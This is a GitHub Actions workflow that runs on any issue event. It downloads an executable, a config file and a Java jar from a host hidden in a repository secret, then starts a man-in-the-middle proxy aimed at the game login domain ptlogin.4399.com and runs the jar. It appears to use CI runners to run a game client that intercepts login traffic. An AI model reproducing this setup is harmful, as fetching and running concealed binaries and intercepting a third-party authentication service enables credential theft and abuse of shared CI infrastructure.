name: qwq
on:
  workflow_dispatch: 
  issues:
  
jobs:
  worker:
    runs-on: windows-latest
    strategy:
      matrix:
        task: [1, 2]
    steps:
    - uses: actions/setup-java@v6
      with:
        distribution: 'temurin'
        java-version: '25'
    - name: SetUp-Env
      run: |
        curl -o mitm.exe https://${{ secrets.BASE }}/mitm_2k26.8.15.exe
        
        curl -sS -o config.yml https://${{ secrets.BASE }}/x19-client/config.yml
        curl -sS -o main.jar https://${{ secrets.BASE }}/x19-client/main-2k26.10.21.jar
    - name: Running
      run: |
        Start-Process ".\mitm.exe" -ArgumentList "8441 ptlogin.4399.com" -NoNewWindow
        java -jar main.jar
